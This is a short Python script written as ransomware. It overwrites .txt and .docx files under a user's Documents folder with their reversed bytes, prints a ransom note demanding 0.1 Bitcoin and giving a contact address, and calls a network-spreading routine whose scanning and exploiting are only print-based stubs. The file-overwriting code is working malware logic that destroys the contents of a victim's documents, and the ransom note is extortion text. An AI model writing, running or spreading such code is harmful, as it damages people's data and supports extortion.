import os

def encrypt(data):
    return data[::-1]

def scan_network():
    return ["192.168.1.2", "192.168.1.3"]

def exploit(machine):
    print(f"Exploiting machine {machine}")

def encrypt_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith(".txt") or file.endswith(".docx"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted_data = encrypt(data)
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
                    print(f"Encrypted {file_path}")
                except Exception as e:
                    print(f"Failed to encrypt {file_path}: {e}")

def display_ransom_note():
    ransom_note = """
    *** IMPORTANT NOTICE ***

    All your files have been encrypted by NotPseudo.
    To decrypt your files and regain access, you must pay a ransom of 0.1 Bitcoin.
    Failure to pay within the specified time will result in permanent loss of your data.

    For payment instructions and assistance, contact notpseudo@protonmail.com.

    *** WARNING ***
    Attempting to decrypt the files or tamper with the ransomware may lead to data loss or corruption.
    """
    print(ransom_note)

def spread_through_network():
    vulnerable_machines = scan_network()
    for machine in vulnerable_machines:
        exploit(machine)

def main():
    encrypt_files("C:/Users/User/Documents")
    display_ransom_note()
    spread_through_network()

if __name__ == "__main__":
    main()
